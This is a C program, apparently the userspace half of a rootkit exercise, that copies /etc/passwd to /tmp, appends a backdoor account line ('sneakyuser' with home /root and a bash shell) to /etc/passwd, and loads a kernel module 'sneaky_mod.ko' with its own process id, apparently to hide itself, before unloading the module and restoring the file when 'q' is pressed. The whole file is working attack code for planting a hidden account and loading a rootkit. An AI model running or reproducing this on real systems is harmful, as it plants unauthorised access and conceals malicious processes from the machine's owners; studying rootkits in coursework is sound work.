#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <termios.h>


void add_sneaky_user(const char * filename) {
  int fd = open(filename, O_WRONLY | O_APPEND);
  if (fd == -1) {
    perror("Failed to open file");
    exit(EXIT_FAILURE);
  }
  const char * text = "sneakyuser:abc123:2000:2000:sneakyuser:/root:/bin/bash\n";
  write(fd, text, strlen(text));
  close(fd);
}

// function to set terminal to raw mode to capture single characters
void enable_raw_mode() {
  struct termios term;
  tcgetattr(STDIN_FILENO, & term);
  // disable echo and canonical mode
  term.c_lflag &= ~(ICANON | ECHO);
  tcsetattr(STDIN_FILENO, TCSANOW, & term);
}

int main() {
  printf("sneaky_process pid = %d\n", getpid());
  system("cp /etc/passwd /tmp");
  add_sneaky_user("/etc/passwd");

  // load the sneaky module
  char command[256];
  sprintf(command, "insmod sneaky_mod.ko sneaky_pid=%d", getpid());
  system(command);

  // loop until 'q' is pressed
  enable_raw_mode();
  char c;
  do {
    read(STDIN_FILENO, & c, 1);
  } while (c != 'q');

  system("rmmod sneaky_mod");
  system("mv /tmp/passwd /etc/passwd");

  return 0;
}